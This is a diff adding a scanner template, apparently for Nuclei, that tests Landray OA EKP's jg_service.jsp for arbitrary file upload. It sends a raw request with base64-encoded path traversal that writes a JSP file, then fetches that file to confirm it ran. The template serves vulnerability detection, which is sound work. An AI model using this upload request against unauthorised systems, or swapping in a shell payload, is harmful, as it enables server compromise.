@@ -1,0 +1,38 @@
+id: landray_ekp_jgservice_fileupload
+
+info:
+  name: landray_ekp_jgservice_fileupload
+  author: xiaokp7
+  severity: critical
+  description: 蓝凌OA EKP jg_service存在任意文件上传漏洞
+
+http:
+  - raw:
+    - |
+      POST /sys/attachment/sys_att_main/jg_service.jsp HTTP/1.1
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
+      Host: {{Hostname}}
+      Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+      Connection: close
+      Content-type: application/x-www-form-urlencoded
+      Content-Length: 206
+
+      DBSTEP V3.0    124            0              999            
+      DBSTEP=REJTVEVQ
+      OPTION=U0FWRUFTSFRNTA==
+      HTMLNAME=Li4vLi4vLi4vLi4vLi4vZWtwL3Jlc291cmNlL3N0Yy5qc3A=
+      RECORDID=
+      DIRECTORY=
+
+      <% out.println(111*111);%>
+    
+    - |
+      GET /resource/stc.jsp HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
+      Accept: */*
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body_2,"12321")'
